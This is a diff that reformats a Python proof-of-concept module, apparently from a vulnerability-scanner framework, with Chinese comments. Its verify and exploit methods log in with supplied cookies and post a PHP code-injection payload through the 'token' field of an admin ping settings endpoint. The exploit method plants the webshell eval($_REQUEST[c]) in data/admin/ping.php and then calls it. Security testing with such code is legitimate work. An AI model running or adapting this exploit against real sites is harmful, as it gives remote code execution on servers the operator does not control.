@@ -45,26 +45,27 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path' ).lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #首先登录用户。获取cookies
+            # 首先登录用户。获取cookies
             s = requests.session()
             cookies = {}
             raw_cookies = self.get_option('cookies')
-            for line in raw_cookies.split(';'):  
-                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
-                cookies[key]=value
+            for line in raw_cookies.split(';'):
+                key, value = line.split('=', 1)  # 1代表只分一次，得到两个数据
+                cookies[key] = value
 
-            #验证漏洞
+            # 验证漏洞
             payload = '/admin/admin_ping.php?action=set'
             url = self.target + payload
             data = {
-                "token":"123456789\";$var=phpinfo().\""
+                "token": "123456789\";$var=phpinfo().\""
             }
             self.output.info('正在尝试上传可执行代码 phpinfo() 到/data/admin/ping.php中')
             s.post(url, data=data, cookies=cookies)
@@ -79,26 +80,28 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path' ).lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #首先登录用户。获取cookies
+            # 首先登录用户。获取cookies
             s = requests.session()
             cookies = {}
             raw_cookies = self.get_option('cookies')
-            for line in raw_cookies.split(';'):  
-                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
-                cookies[key]=value
+            for line in raw_cookies.split(';'):
+                key, value = line.split('=', 1)  # 1代表只分一次，得到两个数据
+                cookies[key] = value
 
-            #验证漏洞
+            # 验证漏洞
             payload = '/admin/admin_ping.php?action=set'
             url = self.target + payload
             data = {
-                "token":"123456789\";$var=eval($_REQUEST[c]).\""
+                "token": "123456789\";$var=eval($_REQUEST[c]).\""
             }
-            self.output.info('正在尝试上传webshell <eval($_REQUEST[c])> 到/data/admin/ping.php中')
+            self.output.info(
+                '正在尝试上传webshell <eval($_REQUEST[c])> 到/data/admin/ping.php中')
             s.post(url, data=data, cookies=cookies)
             verify_url = self.target + '/data/admin/ping.php?c=phpinfo()'
             r = s.get(verify_url)
